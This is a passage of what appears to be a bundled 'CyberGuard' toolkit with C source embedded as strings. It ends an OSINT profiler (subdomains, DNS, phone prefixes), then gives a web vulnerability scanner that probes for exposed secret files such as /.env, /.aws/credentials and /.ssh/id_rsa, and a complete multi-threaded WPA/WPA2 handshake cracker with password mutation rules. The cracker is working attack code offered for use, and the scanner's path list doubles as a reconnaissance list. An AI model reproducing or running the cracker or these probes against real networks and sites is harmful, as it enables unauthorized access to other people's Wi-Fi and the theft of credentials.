static void m_subs(const char*dom){
    printf("\\n%s[MOD] CT Subdomains%s\\n",CC2,XRST);
    char pa[512];snprintf(pa,512,"/?q=%%.%s&output=json",dom);
    HR r=hget("crt.sh",pa,1,0);if(r.st==200){const char*b=bptr(r.body);
        char su[MAX_SUBS][256];int ns=0;const char*p=b;
        while((p=strstr(p,"\\"name_value\\":\\""))&&ns<MAX_SUBS){p+=15;char nm[256]={0};int i=0;while(p[i]&&p[i]!='"'&&i<255){nm[i]=p[i];i++;}nm[i]=0;
            char*n=nm;if(n[0]=='*'&&n[1]=='.')n+=2;if(strlen(n)>strlen(dom)&&strstr(n,dom)){int dp=0;for(int j=0;j<ns;j++)if(!strcmp(su[j],n)){dp=1;break;}if(!dp){strncpy(su[ns],n,255);ns++;}}p+=i;}
        printf("  %s[+]%s %d subdomain(s)\\n",CG,XRST,ns);for(int i=0;i<ns&&i<30;i++)printf("    %s%s%s\\n",CD,su[i],XRST);if(ns>30)printf("    ... +%d\\n",ns-30);}
}

typedef struct{const char*p;const char*c;}CCE;
static const CCE CT2[]={{"1","US/CA"},{"7","RU"},{"33","FR"},{"44","GB"},{"49","DE"},{"34","ES"},{"39","IT"},{"81","JP"},{"82","KR"},{"86","CN"},{"91","IN"},{"55","BR"},{"61","AU"},{"52","MX"},{"90","TR"},{"48","PL"},{"380","UA"},{"966","SA"},{"971","AE"},{"972","IL"},{"212","MA"},{"234","NG"},{"254","KE"},{"351","PT"},{"358","FI"},{"46","SE"},{"47","NO"},{"31","NL"},{"32","BE"},{"41","CH"},{"43","AT"},{"852","HK"},{"886","TW"},{"65","SG"},{"66","TH"},{"62","ID"},{"84","VN"},{"60","MY"},{"64","NZ"},{"20","EG"},{"27","ZA"},{"974","QA"},{NULL,NULL}};

static void m_phone(const char*ph){
    printf("\\n%s[MOD] Phone%s\\n",CC2,XRST);
    char cl[32];int ci=0;for(int i=0;ph[i]&&ci<30;i++)if(isdigit(ph[i])||(i==0&&ph[i]=='+'))cl[ci++]=ph[i];cl[ci]=0;
    const char*s=cl[0]=='+'?cl+1:cl;printf("  %s[+]%s E.164: +%s\\n",CG,XRST,s);
    for(int l=3;l>=1;l--){char pr[4]={0};strncpy(pr,s,l);for(int i=0;CT2[i].p;i++)if(!strcmp(CT2[i].p,pr)){printf("  %s[+]%s Country: %s (+%s)\\n",CG,XRST,CT2[i].c,pr);return;}}
}

int main(int argc,char*argv[]){
    if(argc<2){printf("Usage: %s <target> [-j]\\n\\n40+ platforms, DNS, WHOIS, Shodan, CT logs\\n",argv[0]);return 0;}
    SSL_library_init();SSL_load_error_strings();
    int jo=0;for(int i=2;i<argc;i++)if(!strcmp(argv[i],"-j"))jo=1;
    const char*t=argv[1];TT tt=det(t);
    const char*tn[]={"username","email","domain","ip","phone"};
    printf("\\n%s%s=== DeductOScope - CyberGuard OSINT (C) ===%s\\n  %sTarget:%s %s  %sType:%s %s\\n",CC2,CBOLD,XRST,CBOLD,XRST,t,CBOLD,XRST,tn[tt]);
    struct timespec t0,t1;clock_gettime(CLOCK_MONOTONIC,&t0);
    switch(tt){
    case T_USER:m_user(t);break;
    case T_MAIL:{char lo[128]={0},dm[256]={0};const char*at=strchr(t,'@');if(at){strncpy(lo,t,at-t);strcpy(dm,at+1);}m_user(lo);m_dns(dm);m_whois(dm);break;}
    case T_DOM:m_dns(t);m_whois(t);m_subs(t);
        {char p2[256];snprintf(p2,256,"/resolve?name=%s&type=A",t);HR r2=hget("dns.google",p2,1,0);
        if(r2.st==200){const char*b=bptr(r2.body);const char*d=strstr(b,"\\"data\\":\\"");if(d){d+=8;char ip[64]={0};int i=0;while(d[i]&&d[i]!='"'&&i<63){ip[i]=d[i];i++;}ip[i]=0;if(i>0)m_ip(ip);}}}break;
    case T_IP:m_ip(t);break;
    case T_PHN:m_phone(t);break;
    }
    clock_gettime(CLOCK_MONOTONIC,&t1);double tot=(t1.tv_sec-t0.tv_sec)+(t1.tv_nsec-t0.tv_nsec)/1e9;
    printf("\\n  %s%sComplete%s | %.1fs\\n",CC2,CBOLD,XRST,tot);
    return 0;
}
`,

faille_finder: `/*
 * FailleFinder - CyberGuard Vulnerability Scanner (C Ultra Performance)
 * 6 modules: headers, SSL/TLS, injection, info disclosure (50+ paths), tech, DNS
 * Multi-threaded pthreads, raw sockets + OpenSSL, score /100
 * Inspired by Nikto + Nuclei + SQLMap + Burp
 * Compile: gcc -O3 -march=native -flto -o faille_finder faille_finder.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define BUF 65536
#define MAX_T 32
#define TO 6
#define MF 500

#define CR "\\033[91m"
#define CG "\\033[92m"
#define CY "\\033[93m"
#define CB "\\033[94m"
#define CC "\\033[96m"
#define CD "\\033[90m"
#define CW "\\033[97m"
#define BD "\\033[1m"
#define RS "\\033[0m"

typedef enum{S_C,S_H,S_M,S_L,S_I}Sv;
static const char*SN[]={"CRITICAL","HIGH    ","MEDIUM  ","LOW     ","INFO    "};
static const char*SC[]={CR,CR,CY,CB,CD};
static int sv_c[5]={0};
static int nf=0;
static pthread_mutex_t fl=PTHREAD_MUTEX_INITIALIZER;

static void af(const char*mod,const char*t,Sv s,const char*d){
    pthread_mutex_lock(&fl);nf++;sv_c[s]++;
    printf("  %s[%s]%s %s\\n",SC[s],SN[s],RS,t);
    pthread_mutex_unlock(&fl);
}

typedef struct{int st;char body[BUF];int bl;char hd[BUF];}HR;

static int tc(const char*h,int p){
    struct hostent*he=gethostbyname(h);if(!he)return-1;
    int s=socket(AF_INET,SOCK_STREAM,0);if(s<0)return-1;
    struct sockaddr_in a={0};a.sin_family=AF_INET;a.sin_port=htons(p);
    memcpy(&a.sin_addr,he->h_addr_list[0],he->h_length);
    struct timeval tv={TO,0};setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
    setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    if(connect(s,(struct sockaddr*)&a,sizeof(a))<0){close(s);return-1;}return s;
}

static HR hg(const char*h,const char*pa,int tls){
    HR r={0};r.st=-1;int s=tc(h,tls?443:80);if(s<0)return r;
    char rq[4096];snprintf(rq,4096,"GET %s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: FailleFinder/3.0\\r\\nConnection: close\\r\\n\\r\\n",pa,h);
    if(tls){SSL_CTX*cx=SSL_CTX_new(TLS_client_method());SSL_CTX_set_verify(cx,SSL_VERIFY_NONE,NULL);
        SSL*sl=SSL_new(cx);SSL_set_fd(sl,s);SSL_set_tlsext_host_name(sl,h);
        if(SSL_connect(sl)>0){SSL_write(sl,rq,strlen(rq));int t=0,n;while(t<BUF-1&&(n=SSL_read(sl,r.body+t,BUF-1-t))>0)t+=n;r.body[t]=0;r.bl=t;
            if(t>12&&!strncmp(r.body,"HTTP/",5))r.st=atoi(r.body+9);
            char*sep=strstr(r.body,"\\r\\n\\r\\n");if(sep){int hl=sep-r.body;if(hl<BUF){strncpy(r.hd,r.body,hl);r.hd[hl]=0;memmove(r.body,sep+4,t-hl-3);r.bl=t-hl-4;}}}
        SSL_free(sl);SSL_CTX_free(cx);
    }else{write(s,rq,strlen(rq));int t=0,n;while(t<BUF-1&&(n=read(s,r.body+t,BUF-1-t))>0)t+=n;r.body[t]=0;r.bl=t;
        if(t>12&&!strncmp(r.body,"HTTP/",5))r.st=atoi(r.body+9);
        char*sep=strstr(r.body,"\\r\\n\\r\\n");if(sep){int hl=sep-r.body;if(hl<BUF){strncpy(r.hd,r.body,hl);r.hd[hl]=0;memmove(r.body,sep+4,t-hl-3);r.bl=t-hl-4;}}}
    close(s);return r;
}

static int hhas(const char*hd,const char*n){char lo[BUF],pat[130];int l=strlen(hd);if(l>=BUF)l=BUF-1;
    for(int i=0;i<l;i++)lo[i]=tolower(hd[i]);lo[l]=0;snprintf(pat,130,"\\n%s:",n);return strstr(lo,pat)!=NULL;}

static void hval(const char*hd,const char*n,char*o,int mx){o[0]=0;char lo[BUF];int l=strlen(hd);if(l>=BUF)l=BUF-1;
    for(int i=0;i<l;i++)lo[i]=tolower(hd[i]);lo[l]=0;char pat[130];snprintf(pat,130,"\\n%s:",n);
    char*p=strstr(lo,pat);if(!p)return;int off=p-lo+strlen(pat);while(off<l&&hd[off]==' ')off++;
    int i=0;while(off+i<l&&hd[off+i]!='\\r'&&hd[off+i]!='\\n'&&i<mx-1){o[i]=hd[off+i];i++;}o[i]=0;}

static int m_hdr(const char*h){printf("\\n%s[1/6] Headers%s\\n",CC,RS);int ck=0;
    HR r=hg(h,"/",1);if(r.st<0){af("H","Unreachable",S_H,"");return 1;}
    const char*rq[][2]={{"strict-transport-security","HSTS missing"},{"content-security-policy","CSP missing"},
        {"x-content-type-options","X-Content-Type-Options missing"},{"x-frame-options","X-Frame-Options missing"},
        {"referrer-policy","Referrer-Policy missing"},{"permissions-policy","Permissions-Policy missing"}};
    Sv sv[]={S_H,S_H,S_M,S_M,S_L,S_M};
    for(int i=0;i<6;i++){ck++;if(!hhas(r.hd,rq[i][0]))af("H",rq[i][1],sv[i],"");}
    const char*lk[]={"server","x-powered-by","x-aspnet-version","x-debug-token"};
    for(int i=0;i<4;i++){ck++;char v[256];hval(r.hd,lk[i],v,256);if(v[0]){char m[300];snprintf(m,300,"Info leak: %s: %s",lk[i],v);af("H",m,S_M,"");}}
    ck++;char csp[2048];hval(r.hd,"content-security-policy",csp,2048);
    if(csp[0]){if(strstr(csp,"unsafe-inline"))af("H","CSP: unsafe-inline",S_H,"");if(strstr(csp,"unsafe-eval"))af("H","CSP: unsafe-eval",S_H,"");}
    ck++;char ck2[1024];hval(r.hd,"set-cookie",ck2,1024);if(ck2[0]){char lc[1024];for(int i=0;ck2[i];i++)lc[i]=tolower(ck2[i]);lc[strlen(ck2)]=0;
        if(!strstr(lc,"httponly"))af("H","Cookie: no HttpOnly",S_H,"");if(!strstr(lc,"secure"))af("H","Cookie: no Secure",S_M,"");if(!strstr(lc,"samesite"))af("H","Cookie: no SameSite",S_M,"");}
    return ck;}

static int m_ssl(const char*h){printf("\\n%s[2/6] SSL/TLS%s\\n",CC,RS);int ck=0;
    ck++;SSL_CTX*cx=SSL_CTX_new(TLS_client_method());int s=tc(h,443);
    if(s<0){af("S","Port 443 closed",S_H,"");SSL_CTX_free(cx);return ck;}
    SSL*sl=SSL_new(cx);SSL_set_fd(sl,s);SSL_set_tlsext_host_name(sl,h);
    if(SSL_connect(sl)<=0){af("S","SSL handshake failed",S_H,"");SSL_free(sl);SSL_CTX_free(cx);close(s);return ck;}
    ck++;const char*pr=SSL_get_version(sl);
    if(pr){if(strstr(pr,"TLSv1.0"))af("S","TLS 1.0",S_H,"");else if(strstr(pr,"TLSv1.1"))af("S","TLS 1.1",S_M,"");
        else{char m[64];snprintf(m,64,"Protocol: %s",pr);af("S",m,S_I,"");}}
    ck++;const SSL_CIPHER*c=SSL_get_current_cipher(sl);
    if(c){int b=SSL_CIPHER_get_bits(c,NULL);const char*cn=SSL_CIPHER_get_name(c);
        if(b<128){char m[128];snprintf(m,128,"Weak: %s (%d bit)",cn,b);af("S",m,S_H,"");}
        if(strstr(cn,"RC4")||strstr(cn,"NULL")){char m[128];snprintf(m,128,"Broken: %s",cn);af("S",m,S_C,"");}}
    ck++;X509*ce=SSL_get_peer_certificate(sl);
    if(ce){ASN1_TIME*na=X509_get_notAfter(ce);int d,sc2;
        if(ASN1_TIME_diff(&d,&sc2,NULL,na)){if(d<0)af("S","Cert EXPIRED",S_C,"");
            else if(d<30){char m[64];snprintf(m,64,"Cert: %d days left",d);af("S",m,S_H,"");}
            else{char m[64];snprintf(m,64,"Cert OK (%d days)",d);af("S",m,S_I,"");}}X509_free(ce);}
    SSL_free(sl);SSL_CTX_free(cx);close(s);return ck;}

typedef struct{const char*pa;Sv sv;}SP;
static const SP SPS[]={
    {"/.env",S_C},{"/.git/config",S_C},{"/.git/HEAD",S_C},{"/.htpasswd",S_C},
    {"/backup.sql",S_C},{"/backup.zip",S_C},{"/database.sql",S_C},{"/console",S_C},
    {"/__debug__/",S_C},{"/actuator/env",S_C},{"/.aws/credentials",S_C},{"/.bash_history",S_C},
    {"/.ssh/id_rsa",S_C},{"/credentials.xml",S_C},{"/secrets.yml",S_C},
    {"/phpmyadmin/",S_H},{"/adminer.php",S_H},{"/server-status",S_H},{"/.htaccess",S_H},
    {"/backup/",S_H},{"/config.php",S_H},{"/docker-compose.yml",S_H},{"/info.php",S_H},
    {"/phpinfo.php",S_H},{"/web.config",S_H},{"/elmah.axd",S_H},{"/.DS_Store",S_H},
    {"/debug/",S_H},{"/actuator",S_H},{"/firebase.json",S_H},{"/error_log",S_H},{"/.npmrc",S_H},
    {"/admin/",S_M},{"/graphql",S_M},{"/swagger.json",S_M},{"/api-docs",S_M},
    {"/package.json",S_M},{"/Dockerfile",S_M},{"/config.json",S_M},{"/wp-json/wp/v2/users",S_M},
    {"/robots.txt",S_I},{"/sitemap.xml",S_I},{"/api/",S_I},{"/.well-known/security.txt",S_I},
};
static const int NSP=sizeof(SPS)/sizeof(SPS[0]);
typedef struct{const char*h;const SP*s;int f;}PJ;
static void*ckp(void*a){PJ*j=(PJ*)a;HR r=hg(j->h,j->s->pa,1);
    if(r.st==200&&r.bl>50&&!strstr(r.body,"<!DOCTYPE"))j->f=1;
    else if(r.st==403&&j->s->sv<=S_H)j->f=2;return NULL;}

static int m_disc(const char*h){printf("\\n%s[4/6] Disclosure (%d paths)%s\\n",CC,NSP,RS);
    PJ js[50];for(int i=0;i<NSP;i++){js[i].h=h;js[i].s=&SPS[i];js[i].f=0;}
    pthread_t th[MAX_T];int i=0;while(i<NSP){int b=(NSP-i<MAX_T)?NSP-i:MAX_T;
        for(int j=0;j<b;j++)pthread_create(&th[j],NULL,ckp,&js[i+j]);
        for(int j=0;j<b;j++)pthread_join(th[j],NULL);i+=b;}
    for(int j=0;j<NSP;j++){if(js[j].f==1){char m[200];snprintf(m,200,"%s exposed",js[j].s->pa);af("D",m,js[j].s->sv,"");}
        else if(js[j].f==2){char m[200];snprintf(m,200,"%s exists(403)",js[j].s->pa);af("D",m,S_I,"");}}
    return NSP;}

static int m_inj(const char*h){printf("\\n%s[3/6] Injection%s\\n",CC,RS);int ck=0;
    HR r=hg(h,"/",1);if(r.st<0)return 0;char lo[BUF];int l=r.bl<BUF-1?r.bl:BUF-1;
    for(int i=0;i<l;i++)lo[i]=tolower(r.body[i]);lo[l]=0;
    ck++;if(strstr(lo,"<form")&&!strstr(lo,"csrf")&&!strstr(lo,"_token"))af("I","No CSRF token",S_H,"");
    ck++;if(strstr(lo,"eval(")||strstr(lo,"innerhtml")||strstr(lo,"document.write("))af("I","Dangerous JS functions",S_M,"");
    ck++;int ds=0;if(strstr(lo,"location.hash"))ds++;if(strstr(lo,"location.search"))ds++;if(strstr(lo,"document.referrer"))ds++;
    if(ds){char m[64];snprintf(m,64,"%d DOM-XSS sources",ds);af("I",m,S_M,"");}
    ck++;if(strstr(r.body,"sourceMappingURL"))af("I","Source maps exposed",S_M,"");
    return ck;}

static int m_tech(const char*h){printf("\\n%s[5/6] Tech%s\\n",CC,RS);int ck=0;
    HR r=hg(h,"/",1);if(r.st<0)return 0;char lo[BUF];int l=r.bl<BUF-1?r.bl:BUF-1;
    for(int i=0;i<l;i++)lo[i]=tolower(r.body[i]);lo[l]=0;
    char hl[BUF];int hl2=strlen(r.hd)<BUF-1?(int)strlen(r.hd):BUF-1;for(int i=0;i<hl2;i++)hl[i]=tolower(r.hd[i]);hl[hl2]=0;
    int f=0;char st[512]="";
    struct{const char*n;const char*s;int b;Sv v;const char*w;}sg[]={
        {"WordPress","wp-content",1,S_M,"WP detected"},{"AngularJS","ng-app",1,S_H,"EOL XSS risk"},
        {"React","_reactroot",1,S_I,0},{"Vue","v-cloak",1,S_I,0},{"Next.js","__next",1,S_I,0},
        {"ASP.NET","__viewstate",1,S_H,"Deserialization risk"},{"Django","csrfmiddlewaretoken",1,S_I,0},
        {"PHP","x-powered-by: php",0,S_I,0},{"Nginx","server: nginx",0,S_I,0},{"Apache","server: apache",0,S_I,0},
        {"Cloudflare","server: cloudflare",0,S_I,0},
    };int ns=sizeof(sg)/sizeof(sg[0]);
    for(int i=0;i<ns;i++){ck++;if(strstr(sg[i].b?lo:hl,sg[i].s)){f++;if(st[0])strcat(st,",");strcat(st,sg[i].n);
        if(sg[i].w&&sg[i].v<=S_M){char m[200];snprintf(m,200,"%s — %s",sg[i].n,sg[i].w);af("T",m,sg[i].v,"");}}}
    if(f){char m[200];snprintf(m,200,"%d techs: %s",f,st);af("T",m,S_I,"");}return ck;}

static int m_dns(const char*h){printf("\\n%s[6/6] DNS%s\\n",CC,RS);int ck=0;
    char pa[512];snprintf(pa,512,"/resolve?name=%s&type=TXT",h);HR r=hg("dns.google",pa,1);
    ck++;if(r.st==200){if(!strstr(r.body,"v=spf1"))af("N","No SPF",S_M,"");else if(strstr(r.body,"+all"))af("N","SPF +all",S_H,"");}
    snprintf(pa,512,"/resolve?name=_dmarc.%s&type=TXT",h);r=hg("dns.google",pa,1);
    ck++;if(r.st==200){if(!strstr(r.body,"DMARC"))af("N","No DMARC",S_M,"");else if(strstr(r.body,"p=none"))af("N","DMARC p=none",S_L,"");}
    return ck;}

int main(int argc,char*argv[]){
    if(argc<2){printf("Usage: %s <hostname> [-j]\\n6 modules, multi-threaded, score /100\\n",argv[0]);return 0;}
    SSL_library_init();SSL_load_error_strings();
    int jo=0;for(int i=2;i<argc;i++)if(!strcmp(argv[i],"-j"))jo=1;
    const char*h=argv[1];
    if(!jo){printf("\\n%s%s=== FailleFinder - CyberGuard VulnScan (C) ===%s\\n  %sTarget:%s %s\\n",CR,BD,RS,BD,RS,h);}
    struct timespec t0,t1;clock_gettime(CLOCK_MONOTONIC,&t0);
    int tc2=0;tc2+=m_hdr(h);tc2+=m_ssl(h);tc2+=m_inj(h);tc2+=m_disc(h);tc2+=m_tech(h);tc2+=m_dns(h);
    clock_gettime(CLOCK_MONOTONIC,&t1);double el=(t1.tv_sec-t0.tv_sec)+(t1.tv_nsec-t0.tv_nsec)/1e9;
    int sc=100-sv_c[0]*25-sv_c[1]*10-sv_c[2]*5-sv_c[3]*2;if(sc<0)sc=0;
    if(!jo){printf("\\n  %s%sFINAL%s %d findings | %d checks | %.1fs\\n",CR,BD,RS,nf,tc2,el);
        printf("  %sCRIT:%s%d %sHIGH:%s%d %sMED:%s%d %sLOW:%s%d %sINFO:%s%d\\n",CR,RS,sv_c[0],CR,RS,sv_c[1],CY,RS,sv_c[2],CB,RS,sv_c[3],CD,RS,sv_c[4]);
        printf("  %sScore: %s%d/100%s\\n",BD,sc>=80?CG:sc>=50?CY:CR,sc,RS);}
    else printf("{\\"findings\\":%d,\\"checks\\":%d,\\"elapsed\\":%.2f,\\"score\\":%d}\\n",nf,tc2,el,sc);
    return 0;}
`,

wifi_bruteforce: `/*
 * WiFi BruteForce - CyberGuard (C Ultra Performance)
 * PBKDF2-SHA1 WPA/WPA2 cracking, multi-threaded, 50+ mutation rules
 * Supports .hccapx, .22000 | ~100K+ PMK/s multi-core
 * Compile: gcc -O3 -march=native -flto -o wifi_bf wifi_bf.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <signal.h>
#define MT 64
#define PL 32
#define MW 64
#define MM 200
#define CR "\\033[91m"
#define CG "\\033[92m"
#define CM "\\033[95m"
#define BD "\\033[1m"
#define RS "\\033[0m"
typedef struct{char ss[64];unsigned char bs[6],cl[6],an[32],sn[32],ep[512],mc[16];int el,kv;}HS;
typedef struct{volatile long long at;volatile int fd;char pw[MW];double t0;long long tt;pthread_mutex_t lk;}ST;
static ST S={0,0,"",0,0,PTHREAD_MUTEX_INITIALIZER};static volatile int R=1;
void sh(int s){R=0;}
static void cpmk(const char*p,const char*s,unsigned char*o){PKCS5_PBKDF2_HMAC(p,strlen(p),(unsigned char*)s,strlen(s),4096,EVP_sha1(),PL,o);}
static void cptk(const unsigned char*pmk,const unsigned char*an,const unsigned char*sn,const unsigned char*a,const unsigned char*s,unsigned char*ptk){
    unsigned char d[76];if(memcmp(a,s,6)<0){memcpy(d,a,6);memcpy(d+6,s,6);}else{memcpy(d,s,6);memcpy(d+6,a,6);}
    if(memcmp(an,sn,32)<0){memcpy(d+12,an,32);memcpy(d+44,sn,32);}else{memcpy(d+12,sn,32);memcpy(d+44,an,32);}
    for(int i=0;i<4;i++){unsigned char in[100];memcpy(in,"Pairwise key expansion",23);memcpy(in+23,d,76);in[99]=i;unsigned int l=20;HMAC(EVP_sha1(),pmk,PL,in,100,ptk+i*20,&l);}}
static int vmc(const unsigned char*ptk,const unsigned char*ep,int el,const unsigned char*em,int kv){
    unsigned char m[20],ec[512];unsigned int l=20;memcpy(ec,ep,el);memset(ec+81,0,16);
    if(kv==1)HMAC(EVP_md5(),ptk,16,ec,el,m,&l);else HMAC(EVP_sha1(),ptk,16,ec,el,m,&l);return memcmp(m,em,16)==0;}
static int gmt(const char*w,char mt[][MW]){int n=0,wl=strlen(w);if(wl<1||wl>=MW-10)return 0;
    strncpy(mt[n++],w,MW-1);char t[MW];for(int i=0;w[i];i++)t[i]=tolower(w[i]);t[wl]=0;strncpy(mt[n++],t,MW-1);
    for(int i=0;w[i];i++)t[i]=toupper(w[i]);t[wl]=0;strncpy(mt[n++],t,MW-1);
    strcpy(t,w);t[0]=toupper(t[0]);strncpy(mt[n++],t,MW-1);
    for(int d=0;d<10&&n<MM;d++)snprintf(mt[n++],MW,"%s%d",w,d);
    for(int d=0;d<100&&n<MM;d++)snprintf(mt[n++],MW,"%s%02d",w,d);
    int ns[]={123,456,789,1234,12345,111,666,777,999};for(int i=0;i<9&&n<MM;i++)snprintf(mt[n++],MW,"%s%d",w,ns[i]);
    const char*sp="!@#$%&*";for(int i=0;sp[i]&&n<MM;i++)snprintf(mt[n++],MW,"%s%c",w,sp[i]);
    strcpy(t,w);for(int i=0;t[i];i++){switch(tolower(t[i])){case'a':t[i]='@';break;case'e':t[i]='3';break;case'i':t[i]='1';break;case'o':t[i]='0';break;case's':t[i]='5';break;case't':t[i]='7';break;}}
    if(strcmp(t,w)&&n<MM)strncpy(mt[n++],t,MW-1);
    if(n<MM){for(int i=0;i<wl;i++)t[i]=w[wl-1-i];t[wl]=0;strncpy(mt[n++],t,MW-1);}
    for(int y=2020;y<=2026&&n<MM;y++)snprintf(mt[n++],MW,"%s%d",w,y);
    int v=0;for(int i=0;i<n;i++){int ml=strlen(mt[i]);if(ml>=8&&ml<=63){if(i!=v)strcpy(mt[v],mt[i]);v++;}}return v;}
typedef struct{char**ws;int cnt;HS*hs;int mut;}WA;
static void*cwk(void*a){WA*wa=(WA*)a;unsigned char pmk[PL],ptk[80];char mt[MM][MW];
    for(int i=0;i<wa->cnt&&!S.fd&&R;i++){if(wa->mut){int nm=gmt(wa->ws[i],mt);
        for(int m=0;m<nm&&!S.fd&&R;m++){cpmk(mt[m],wa->hs->ss,pmk);cptk(pmk,wa->hs->an,wa->hs->sn,wa->hs->bs,wa->hs->cl,ptk);
            if(vmc(ptk,wa->hs->ep,wa->hs->el,wa->hs->mc,wa->hs->kv)){pthread_mutex_lock(&S.lk);S.fd=1;strncpy(S.pw,mt[m],MW-1);pthread_mutex_unlock(&S.lk);return NULL;}
            __sync_fetch_and_add(&S.at,1);}}
    else{int wl=strlen(wa->ws[i]);if(wl<8||wl>63)continue;cpmk(wa->ws[i],wa->hs->ss,pmk);cptk(pmk,wa->hs->an,wa->hs->sn,wa->hs->bs,wa->hs->cl,ptk);
        if(vmc(ptk,wa->hs->ep,wa->hs->el,wa->hs->mc,wa->hs->kv)){pthread_mutex_lock(&S.lk);S.fd=1;strncpy(S.pw,wa->ws[i],MW-1);pthread_mutex_unlock(&S.lk);return NULL;}
        __sync_fetch_and_add(&S.at,1);}}return NULL;}
static int lhcx(const char*p,HS*h){FILE*f=fopen(p,"rb");if(!f)return-1;unsigned char b[512];int n=fread(b,1,512,f);fclose(f);if(n<393)return-1;
    unsigned int sg;memcpy(&sg,b,4);if(sg!=0x58504348)return-1;memcpy(&h->kv,b+8,4);memcpy(h->ss,b+16,32);h->ss[32]=0;
    memcpy(h->bs,b+59,6);memcpy(h->an,b+65,32);memcpy(h->cl,b+97,6);memcpy(h->sn,b+103,32);
    unsigned short el;memcpy(&el,b+135,2);h->el=el;memcpy(h->ep,b+141,el>512?512:el);memcpy(h->mc,b+141+81,16);return 0;}
static int h2b(const char*x,unsigned char*o,int m){int i=0;while(x[i*2]&&x[i*2+1]&&i<m){char h[3]={x[i*2],x[i*2+1],0};o[i]=(unsigned char)strtol(h,NULL,16);i++;}return i;}
static int l22(const char*p,HS*h){FILE*f=fopen(p,"r");if(!f)return-1;char l[4096];if(!fgets(l,sizeof(l),f)){fclose(f);return-1;}fclose(f);
    if(strncmp(l,"WPA",3))return-1;char*pt[10];int np=0;char*pk=strtok(l,"*");while(pk&&np<10){pt[np++]=pk;pk=strtok(NULL,"*");}if(np<8)return-1;
    h2b(pt[2],h->mc,16);h2b(pt[3],h->bs,6);h2b(pt[4],h->cl,6);int sl=h2b(pt[5],(unsigned char*)h->ss,63);h->ss[sl]=0;
    h2b(pt[6],h->an,32);h->el=h2b(pt[7],h->ep,512);if(h->el>49)memcpy(h->sn,h->ep+17,32);h->kv=2;return 0;}
static int lhs(const char*p,HS*h){memset(h,0,sizeof(HS));int l=strlen(p);
    if(l>6&&!strcmp(p+l-6,".22000"))return l22(p,h);if(l>7&&!strcmp(p+l-7,".hccapx"))return lhcx(p,h);
    if(lhcx(p,h)==0)return 0;return l22(p,h);}
static void*pth(void*a){while(!S.fd&&R){struct timespec ts;clock_gettime(CLOCK_MONOTONIC,&ts);
    double e=ts.tv_sec+ts.tv_nsec/1e9-S.t0,s=S.at/(e>0?e:1),p=S.tt>0?(double)S.at/S.tt*100:0;
    fprintf(stderr,"\\r  [%5.1f%%] %lld/%lld | %.0f PMK/s | ETA: %.0fs  ",p,S.at,S.tt,s,s>0?(S.tt-S.at)/s:0);usleep(500000);}return NULL;}
int main(int argc,char*argv[]){
    if(argc<3){printf("%s%s=== WiFi BruteForce - CyberGuard (C) ===%s\\nUsage: %s <handshake> <wordlist> [-t N] [-m] [-j]\\n",CM,BD,RS,argv[0]);
        printf("  -t N  Threads (max %d)\\n  -m    Mutations (50+ rules)\\n  -j    JSON\\n~100K+ PMK/s multi-core\\n",MT);return 0;}
    signal(SIGINT,sh);OpenSSL_add_all_algorithms();int thr=8,mut=0,jo=0;
    for(int i=3;i<argc;i++){if(!strcmp(argv[i],"-t")&&i+1<argc)thr=atoi(argv[++i]);else if(!strcmp(argv[i],"-m"))mut=1;else if(!strcmp(argv[i],"-j"))jo=1;}
    if(thr>MT)thr=MT;if(thr<1)thr=1;HS hs;if(lhs(argv[1],&hs)!=0){fprintf(stderr,"%s[!]%s Failed: %s\\n",CR,RS,argv[1]);return 1;}
    if(!jo)printf("\\n%s%s=== WiFi BruteForce (C) ===%s\\n  SSID: %s | T: %d | Mut: %s\\n",CM,BD,RS,hs.ss,thr,mut?"ON":"OFF");
    FILE*f=fopen(argv[2],"r");if(!f){fprintf(stderr,"Cannot open: %s\\n",argv[2]);return 1;}
    char**ws=NULL;int nw=0,cp=100000;ws=malloc(cp*sizeof(char*));char ln[256];
    while(fgets(ln,sizeof(ln),f)){int l=strlen(ln);while(l>0&&(ln[l-1]=='\\n'||ln[l-1]=='\\r'))ln[--l]=0;
        if(l<8||l>63)continue;if(nw>=cp){cp*=2;ws=realloc(ws,cp*sizeof(char*));}ws[nw++]=strdup(ln);}fclose(f);
    if(!jo)printf("  Words: %d\\n\\n  %sCracking...%s\\n\\n",nw,CM,RS);
    S.tt=mut?(long long)nw*50:nw;struct timespec ts;clock_gettime(CLOCK_MONOTONIC,&ts);S.t0=ts.tv_sec+ts.tv_nsec/1e9;
    pthread_t pt;if(!jo)pthread_create(&pt,NULL,pth,NULL);pthread_t th[MT];WA args[MT];int ch=nw/thr;
    for(int i=0;i<thr;i++){args[i].hs=&hs;args[i].mut=mut;args[i].ws=ws+i*ch;args[i].cnt=(i==thr-1)?nw-i*ch:ch;pthread_create(&th[i],NULL,cwk,&args[i]);}
    for(int i=0;i<thr;i++)pthread_join(th[i],NULL);R=0;if(!jo){pthread_join(pt,NULL);printf("\\n");}
    clock_gettime(CLOCK_MONOTONIC,&ts);double el=ts.tv_sec+ts.tv_nsec/1e9-S.t0,sp=S.at/(el>0?el:1);
    if(jo)printf("{\\"found\\":%s,\\"pw\\":\\"%s\\",\\"ssid\\":\\"%s\\",\\"at\\":%lld,\\"spd\\":%.0f,\\"t\\":%.2f}\\n",S.fd?"true":"false",S.fd?S.pw:"",hs.ss,S.at,sp,el);
    else{printf("\\n  %s════════════════════════════════════════%s\\n",CM,RS);
        if(S.fd)printf("  %s%s[+] KEY: %s%s\\n",CG,BD,S.pw,RS);else printf("  %s[-] Not found%s\\n",CR,RS);
        printf("  %lld att | %.0f PMK/s | %.1fs\\n  %s════════════════════════════════════════%s\\n",S.at,sp,el,CM,RS);}
    for(int i=0;i<nw;i++)free(ws[i]);free(ws);return S.fd?0:1;}
`,

};
